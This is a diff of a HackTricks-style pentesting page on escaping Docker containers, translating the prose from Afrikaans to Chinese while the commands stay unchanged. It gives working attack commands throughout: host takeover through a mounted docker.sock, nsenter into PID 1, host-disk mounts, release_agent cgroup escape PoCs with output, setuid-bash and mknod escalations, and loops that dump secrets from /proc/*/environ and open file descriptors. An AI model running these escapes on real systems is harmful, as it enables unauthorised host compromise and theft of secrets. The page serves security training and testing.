@@ -1,16 +1,16 @@
-# Docker Uitbreek / Voorregverhoging
+# Docker Breakout / Privilege Escalation
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
@@ -18,29 +18,29 @@ Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="li
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkstrome outomaties** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
-Kry Vandaag Toegang:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) 轻松构建和 **自动化工作流**，由世界上 **最先进** 的社区工具提供支持。\
+今天就获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
-## Outomatiese Opsomming & Ontsnapping
+## 自动枚举与逃逸
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **houers opsom**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie hulpmiddel is baie **nuttig om die houer waarin jy is te opsom en selfs probeer om outomaties te ontsnap**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige hulpmiddel om die voorregte te kry wat die houer het om maniere te vind om daaruit te ontsnap
-* [**deepce**](https://github.com/stealthcopter/deepce): Hulpmiddel om te opsom en te ontsnap uit houers
-* [**grype**](https://github.com/anchore/grype): Kry die CVE's wat in die sagteware geïnstalleer in die beeld bevat
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：它也可以 **枚举容器**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery)：这个工具对于枚举你所在的容器非常 **有用，甚至尝试自动逃逸**
+* [**amicontained**](https://github.com/genuinetools/amicontained)：有用的工具，用于获取容器的权限，以寻找逃逸的方法
+* [**deepce**](https://github.com/stealthcopter/deepce)：用于枚举和逃逸容器的工具
+* [**grype**](https://github.com/anchore/grype)：获取镜像中安装的软件所包含的 CVE
 
-## Gemoniteerde Docker Sokkel Ontsnapping
+## 挂载 Docker 套接字逃逸
 
-As jy op een of ander manier vind dat die **docker-sokkel** binne die docker-houer gemoniteer is, sal jy daaruit kan ontsnap.\
-Dit gebeur gewoonlik in docker-houers wat om een ​​of ander rede moet koppel aan die docker-daemon om aksies uit te voer.
+如果你发现 **docker 套接字被挂载** 在 docker 容器内，你将能够从中逃逸。\
+这通常发生在某些需要连接到 docker 守护进程以执行操作的 docker 容器中。
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-In hierdie geval kan jy gewone docker-opdragte gebruik om met die docker-daemon te kommunikeer:
+在这种情况下，您可以使用常规的 docker 命令与 docker 守护进程进行通信：
 ```bash
 #List images to use one
 docker images
@@ -55,13 +55,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-In geval die **docker sokket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
+如果 **docker socket 在意外的位置**，您仍然可以使用带有参数 **`-H unix:///path/to/docker.sock`** 的 **`docker`** 命令与其通信。
 {% endhint %}
 
-Docker daemon kan ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kan kommunikasie met die Docker daemon plaasvind oor die Systemd sokket `fd://`.
+Docker 守护进程也可能 [在端口上监听（默认是 2375, 2376）](../../../../network-services-pentesting/2375-pentesting-docker.md)，或者在基于 Systemd 的系统上，可以通过 Systemd socket `fd://` 与 Docker 守护进程进行通信。
 
 {% hint style="info" %}
-Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewings:
+此外，请注意其他高级运行时的运行时套接字：
 
 * dockershim: `unix:///var/run/dockershim.sock`
 * containerd: `unix:///run/containerd/containerd.sock`
@@ -71,23 +71,23 @@ Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewin
 * ...
 {% endhint %}
 
-## Misbruik van Bevoegdhede Ontsnapping
+## 能力滥用逃逸
 
-Jy moet die bevoegdhede van die houer nagaan, as dit enige van die volgende het, kan jy dalk daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+您应该检查容器的能力，如果它具有以下任何一种，您可能能够逃离它： **`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE`、`CAP_SYS_RAWIO`、`CAP_SYSLOG`、`CAP_NET_RAW`、`CAP_NET_ADMIN`**
 
-Jy kan tans die houer se bevoegdhede nagaan deur **voorheen genoemde outomatiese gereedskap** of te gebruik:
+您可以使用 **之前提到的自动工具** 或：
 ```bash
 capsh --print
 ```
-Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te misbruik om voorregte te ontsnap/te verhoog:
+在以下页面中，您可以**了解更多关于 Linux 能力**的信息，以及如何滥用它们以逃逸/提升权限：
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Ontsnapping uit Bevoorregte Houers
+## 从特权容器中逃逸
 
-'n Bevoorregte houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigings uit te skakel:
+可以使用标志 `--privileged` 创建特权容器，或禁用特定防御：
 
 * `--cap-add=ALL`
 * `--security-opt apparmor=unconfined`
@@ -99,44 +99,44 @@ Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te
 * `--cgroupns=host`
 * `Mount /dev`
 
-Die `--privileged` vlag verlaag houer-sekuriteit aansienlik, deur **ongelimiteerde toegang tot toestelle** te bied en **verskeie beskermings** te omseil. Vir 'n gedetailleerde ontleding, verwys na die dokumentasie oor die volle impakte van `--privileged`.
+`--privileged` 标志显著降低容器安全性，提供**无限制的设备访问**并绕过**多个保护措施**。有关详细信息，请参阅 `--privileged` 的完整影响文档。
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
 {% endcontent-ref %}
 
-### Bevoorregte + hostPID
+### 特权 + hostPID
 
-Met hierdie toestemmings kan jy net **beweeg na die namespace van 'n proses wat op die gasheer as root hardloop** soos init (pid:1) deur net te hardloop: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+使用这些权限，您可以简单地**以 root 身份移动到主机中运行的进程的命名空间**，例如 init (pid:1)，只需运行：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
-Toets dit in 'n houer deur uit te voer:
+在容器中测试：
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
-### Bevoorreg
+### Privileged
 
-Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te kry of probeer **ontsnap deur die release\_agent of ander ontsnappings te misbruik**.
+仅凭特权标志，您可以尝试**访问主机的磁盘**或尝试**通过滥用 release\_agent 或其他逃逸进行逃逸**。
 
-Toets die volgende omseilings in 'n houer uit te voer:
+在容器中执行以下绕过测试：
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
-#### Monteer Disk - Poc1
+#### Mounting Disk - Poc1
 
-Goed geconfigureerde docker-houers sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapitaliseer gespesifiseer is, is dit moontlik om die regte te kry om die gas-aandrywing te sien.
+配置良好的 docker 容器不会允许像 **fdisk -l** 这样的命令。然而，在错误配置的 docker 命令中，如果指定了标志 `--privileged` 或 `--device=/dev/sda1`，则可以获得查看主机驱动器的权限。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-Dus, om die gasmasjien oor te neem, is dit triviaal:
+因此，要接管主机机器，这非常简单：
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
-En voilà! Jy kan nou toegang kry tot die lêersisteem van die gasheer omdat dit in die `/mnt/hola`-vouer gemoniteer is.
+And voilà ! 现在您可以访问主机的文件系统，因为它已挂载在 `/mnt/hola` 文件夹中。
 
-#### Montering van Skyf - Poc2
+#### Mounting Disk - Poc2
 
-Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-OS te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
+在容器内，攻击者可能会尝试通过集群创建的可写 hostPath 卷进一步访问底层主机操作系统。以下是您可以在容器内检查的一些常见内容，以查看您是否可以利用此攻击者向量：
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -157,9 +157,9 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Bevoorregte Ontsnapping deur gebruik te maak van bestaande release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### 特权逃逸 利用现有的 release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
-{% code title="Aanvanklike PoC" %}
+{% code title="初始 PoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -195,9 +195,9 @@ cat /o
 ```
 {% endcode %}
 
-#### Bevoorregte Ontsnapping deur die skepping van release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### 特权逃逸 利用创建的 release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 
-{% code title="Tweede PoC" %}
+{% code title="第二个 PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -241,15 +241,15 @@ cat /output
 ```
 {% endcode %}
 
-Vind 'n **verduideliking van die tegniek** in:
+找到该技术的**解释**在：
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Bevoorregte Ontsnapping deur die release\_agent te misbruik sonder om die relatiewe pad te ken - PoC3
+#### 特权逃逸 利用 release\_agent 而不知道相对路径 - PoC3
 
-In die vorige aanvalle is die **absoluite pad van die houer binne die gasheer se lêersisteem bekendgemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absoluite pad van die houer binne die gasheer ken nie** kan jy hierdie tegniek gebruik:
+在之前的漏洞中，**主机文件系统中容器的绝对路径被泄露**。然而，这并不总是如此。在您**不知道主机中容器的绝对路径**的情况下，可以使用此技术：
 
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
@@ -313,7 +313,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-Die uitvoering van die PoC binne 'n bevoorregte houer behoort uitset te lewer soortgelyk aan:
+在特权容器中执行 PoC 应该提供类似于以下的输出：
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -341,32 +341,33 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Bevoorregte Ontsnapping deur Misbruik van Sensitiewe Monterings
+#### 特权逃逸滥用敏感挂载
 
-Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs **aandui dat iets deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap). Die misbruik van hierdie lêers mag toelaat dat:
+有几个文件可能被挂载，这些文件提供了**关于底层主机的信息**。其中一些甚至可能指示**当发生某些事情时由主机执行的内容**（这将允许攻击者逃离容器）。\
+滥用这些文件可能允许：
 
-* release\_agent (reeds behandel voorheen)
+* release\_agent（之前已经讨论过）
 * [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
 * [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
 * [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
 * [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-Nietemin, kan jy **ander sensitiewe lêers** vind om te kontroleer op hierdie bladsy:
+然而，您可以在此页面找到**其他敏感文件**进行检查：
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
 {% endcontent-ref %}
 
-### Willekeurige Monterings
+### 任意挂载
 
-In verskeie gevalle sal jy vind dat die **houdster 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek geconfigureer is nie, kan jy dalk **toegang verkry/wysig tot sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
+在多种情况下，您会发现**容器从主机挂载了一些卷**。如果这个卷没有正确配置，您可能能够**访问/修改敏感数据**：读取秘密，修改 ssh authorized\_keys……
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Voorregverhoging met 2 doppe en gasheermontering
+### Privilege Escalation with 2 shells and host mount
 
-As jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheer gemonteer het en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer** en het leestoegang oor die gemonteerde vouer.\
-Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit **uitvoer vanaf die gasheer** om voorregverhoging te bewerkstellig.
+如果您以 **root 身份访问容器**，并且有一些来自主机的文件夹被挂载，并且您已经 **以非特权用户身份逃逸到主机** 并对挂载的文件夹具有读取权限。\
+您可以在 **容器** 内的 **挂载文件夹** 中创建一个 **bash suid 文件**，并 **从主机执行它** 以进行权限提升。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -374,14 +375,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Voorregskaping met 2 doppe
+### Privilege Escalation with 2 shells
 
-Indien jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide doppe misbruik om **voorregskaping binne die gasheer** te bewerkstellig as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**verduidelik in hierdie pos**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel-lêers te skep**. Toestellêers is spesiale lêers wat gebruik word om **onderliggende hardeware & kernelmodules te benader**. Byvoorbeeld, die /dev/sda bloktoestel-lêer gee toegang om **die rou data op die stelsel se skyf te lees**.
+如果您在**容器内以root身份访问**并且已经**以非特权用户身份逃逸到主机**，您可以利用两个shell来**在主机内进行特权升级**，前提是您在容器内具有MKNOD能力（默认情况下是这样的），如[**在这篇文章中所解释的**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
+拥有这样的能力，容器内的root用户被允许**创建块设备文件**。设备文件是特殊文件，用于**访问底层硬件和内核模块**。例如，/dev/sda块设备文件提供了**读取系统磁盘上原始数据的访问权限**。
 
-Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup-beleid af te dwing wat **bloktoestel lees/skryf-operasies blokkeer**. Nietemin, as 'n bloktoestel binne die houer **geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/**-gids. Hierdie toegang vereis dat die **proses-eienaar dieselfde is** binne en buite die houer.
+Docker通过强制执行cgroup策略来防止容器内块设备的滥用，**阻止块设备的读/写操作**。然而，如果在容器内**创建了块设备**，则可以通过**/proc/PID/root/**目录从容器外部访问。此访问要求**进程所有者在容器内外必须相同**。
 
-**Uitbuiting** voorbeeld van hierdie [**verslag**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+**利用**示例来自这篇[**文章**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -419,13 +420,13 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-As jy toegang het tot die prosesse van die gasheer, sal jy in staat wees om baie sensitiewe inligting wat in daardie prosesse gestoor word, te benader. Voer toets laboratorium uit:
+如果您可以访问主机的进程，您将能够访问存储在这些进程中的大量敏感信息。运行测试实验室：
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Byvoorbeeld, jy sal in staat wees om die prosesse te lys deur iets soos `ps auxn` te gebruik en te soek na sensitiewe besonderhede in die opdragte.
+例如，您将能够使用类似 `ps auxn` 的命令列出进程，并在命令中搜索敏感细节。
 
-Dan, aangesien jy **toegang het tot elke proses van die gasheer in /proc/, kan jy net hul omgewingsgeheime steel** deur uit te voer:
+然后，**由于您可以访问 /proc/ 中主机的每个进程，您可以直接窃取它们的环境秘密**，运行：
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -434,7 +435,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-Jy kan ook **toegang verkry tot ander prosesse se lêerbeskrywers en hul oop lêers lees**:
+您还可以**访问其他进程的文件描述符并读取它们打开的文件**：
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -444,82 +445,82 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
-Jy kan ook **prosesse doodmaak en 'n DoS veroorsaak**.
+您还可以**终止进程并导致拒绝服务（DoS）**。
 
 {% hint style="warning" %}
-As jy op een of ander manier bevoorregte **toegang oor 'n proses buite die houer** het, kan jy iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` hardloop om **'n skaal met dieselfde ns-beperkings** (hopelik geen) **as daardie proses**.
+如果您以某种方式拥有**对容器外部进程的特权访问**，您可以运行类似 `nsenter --target <pid> --all` 或 `nsenter --target <pid> --mount --net --pid --cgroup` 的命令，以**在与该进程相同的命名空间限制下运行一个 shell**（希望没有限制）。
 {% endhint %}
 
 ### hostNetwork
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Indien 'n houer ingestel is met die Docker [gasnetwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gas se netwerk-namespace), en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, die **houer bind alle dienste direk aan die gas se IP**. Verder kan die houer **ALLE netwerkverkeer wat die gas** stuur en ontvang op die gedeelde koppelvlak onderskep met `tcpdump -i eth0`.
+如果一个容器使用 Docker [主机网络驱动程序 (`--network=host`)](https://docs.docker.com/network/host/) 配置，则该容器的网络栈与 Docker 主机不隔离（容器共享主机的网络命名空间），并且容器不会分配自己的 IP 地址。换句话说，**容器将所有服务直接绑定到主机的 IP**。此外，容器可以**拦截主机在共享接口上发送和接收的所有网络流量** `tcpdump -i eth0`。
 
-Byvoorbeeld, jy kan dit gebruik om **verkeer te snuif en selfs te vervals** tussen die gas en metadata-instansie.
+例如，您可以使用此方法**嗅探甚至伪造主机与元数据实例之间的流量**。
 
-Soos in die volgende voorbeelde:
+如以下示例所示：
 
-* [Verslag: Hoe om Google SRE te kontak: 'n Skulping in die wolk SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [Metadata-diens MITM maak wortelprivilege-escalatie moontlik (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Jy sal ook in staat wees om **netwerkdienste wat aan die plaaslike gas** gebind is binne die gas te bereik of selfs toegang te verkry tot die **metadata-toestemmings van die node** (wat dalk verskil van dié wat 'n houer kan bereik).
+您还将能够访问**绑定到 localhost 的网络服务**，甚至访问**节点的元数据权限**（这可能与容器可以访问的权限不同）。
 
 ### hostIPC
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-Met `hostIPC=true`, verkry jy toegang tot die inter-process kommunikasie (IPC) bronne van die gasheer, soos **gedeelde geheue** in `/dev/shm`. Dit maak dit moontlik om te lees/skryf waar dieselfde IPC-bronne deur ander gasheer- of houerprosesse gebruik word. Gebruik `ipcs` om hierdie IPC-meganismes verder te ondersoek.
+使用 `hostIPC=true`，您可以访问主机的进程间通信（IPC）资源，例如 `/dev/shm` 中的 **共享内存**。这允许读取/写入其他主机或 pod 进程使用的相同 IPC 资源。使用 `ipcs` 进一步检查这些 IPC 机制。
 
-* **Ondersoek /dev/shm** - Soek na enige lêers in hierdie gedeelde geheue-plek: `ls -la /dev/shm`
-* **Ondersoek bestaande IPC-fasiliteite** - Jy kan nagaan of enige IPC-fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`
+* **检查 /dev/shm** - 查找此共享内存位置中的任何文件： `ls -la /dev/shm`
+* **检查现有的 IPC 设施** – 您可以使用 `/usr/bin/ipcs` 检查是否正在使用任何 IPC 设施。检查命令为： `ipcs -a`
 
-### Herstel vaardighede
+### 恢复能力
 
-As die systaalaanroep **`unshare`** nie verbied is nie, kan jy al die vaardighede herwin deur dit uit te voer:
+如果系统调用 **`unshare`** 没有被禁止，您可以恢复所有能力：
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Gebruikersnaamruimte misbruik via symboliese skakel
+### 用户命名空间通过符号链接的滥用
 
-Die tweede tegniek wat verduidelik word in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) dui aan hoe jy bind mounts met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).
+帖子中解释的第二种技术 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) 指出如何利用用户命名空间滥用绑定挂载，以影响主机内部的文件（在特定情况下，删除文件）。
 
 <figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) om maklik te bou en **werkstrome outomaties** te dryf met die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
-Kry Toegang Vandag:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) 轻松构建和 **自动化工作流**，由世界上 **最先进** 的社区工具提供支持。\
+今天获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}
 
-## CVE's
+## CVEs
 
-### Runc uitbuiting (CVE-2019-5736)
+### Runc 漏洞 (CVE-2019-5736)
 
-In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te eskaleer deur te ontsnap uit 'n houer wat misbruik maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvryf vanuit 'n houer**, sodat enigeen wat `docker exec` uitvoer die lading kan aktiveer.
+如果您可以以 root 身份执行 `docker exec`（可能使用 sudo），您可以尝试通过利用 CVE-2019-5736 来提升权限（漏洞 [在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。该技术基本上会 **覆盖** **主机** 的 _**/bin/sh**_ 二进制文件 **来自容器**，因此任何执行 docker exec 的人都可能触发有效载荷。
 
-Verander die lading dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre lêer moet in die docker-houer geplaas word vir uitvoering.\
-Met uitvoering, sodra dit `[+] Oorvryf /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer-rekenaar uitvoer:
+相应地更改有效载荷，并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中以供执行。\
+执行后，一旦显示 `[+] Overwritten /bin/sh successfully`，您需要从主机机器执行以下命令：
 
-`docker exec -it <houer-naam> /bin/sh`
+`docker exec -it <container-name> /bin/sh`
 
-Dit sal die lading aktiveer wat teenwoordig is in die main.go lêer.
+这将触发 main.go 文件中存在的有效载荷。
 
-Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+更多信息： [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+容器可能还会受到其他 CVE 的影响，您可以在 [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) 找到列表
 {% endhint %}
 
-## Docker Aangepaste Ontsnapping
+## Docker 自定义逃逸
 
-### Docker Ontsnappingsoppervlak
+### Docker 逃逸表面
 
-* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap om met ander prosesse te interaksieer as gevolg van naamruimtes (standaard kan nie kommunikeer via IPC's, Unix-sockets, netwerkdienste, D-Bus, `/proc` van ander prosesse nie).
-* **Root-gebruiker**: Standaard is die gebruiker wat die proses hardloop die root-gebruiker (tans is sy voorregte beperk).
